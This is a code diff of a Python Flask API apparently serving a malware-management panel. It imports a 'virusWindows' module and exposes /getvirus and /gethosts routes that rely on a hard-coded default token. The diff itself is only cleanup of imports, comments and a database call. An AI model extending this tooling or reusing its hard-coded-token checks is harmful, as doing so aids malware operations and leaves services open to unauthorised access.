@@ -7,17 +7,8 @@ import sqlite3
 from . import db
 import json
 import os
-import socket
-import threading
 import socketio
-import collections
-from collections import OrderedDict
-import traceback
-# from . import crypto
-import base64
-# from cryptography.hazmat.primitives.serialization import Encoding
-# from Crypto.PublicKey import RSA
-# Import viris compiler script
+
 import virusWindows as virus
 
 ## Ignore temp lack of ssl
@@ -34,12 +25,13 @@ def dbConnect():
     global curs
     curs = conn.cursor()
 
-
+# Does not get used but could reduce repetativeness 
 def execute_query(query, params):
     with sqlite3.connect('instance/databasen.db') as conn:
         curs = conn.cursor()
         curs.execute(query, params)
         result = curs.fetchall()
+        conn.close()
     return result
 
 
@@ -156,12 +148,6 @@ def saveHost():
 @api.route('/getvirus', methods=['GET'])
 def getVirus(userId = "1", token = "1234567890"):
     print("getvirus")
-    # print(current_user.id)
-    # data = request.get_json()
-    # print(data)
-    # userId = data['userId']
-    # token = data['token']
-    # print(token)
     if token == userToken:
         try:
             dbConnect()
@@ -185,12 +171,6 @@ def getVirus(userId = "1", token = "1234567890"):
 @api.route('/gethosts', methods=['GET'])
 def getHosts(userId = "1", token = "1234567890"):
     print("getHosts")
-    # print(current_user.id)
-    # data = request.get_json()
-    # print(data)
-    # userId = data['userId']
-    # token = data['token']
-    # print(token)
     if token == userToken:
         try:
             dbConnect()
@@ -267,17 +247,9 @@ def deleteHost():
         return jsonify({'message': 'token not valid'})
 
 
-
-
-
-
-
-
-
 ########## Testing area ############
-
-
 ## Json examples ##
+## Gets used to test APIs with json as data in the calls
 
 exampleUser = {
     "user_id": 1,
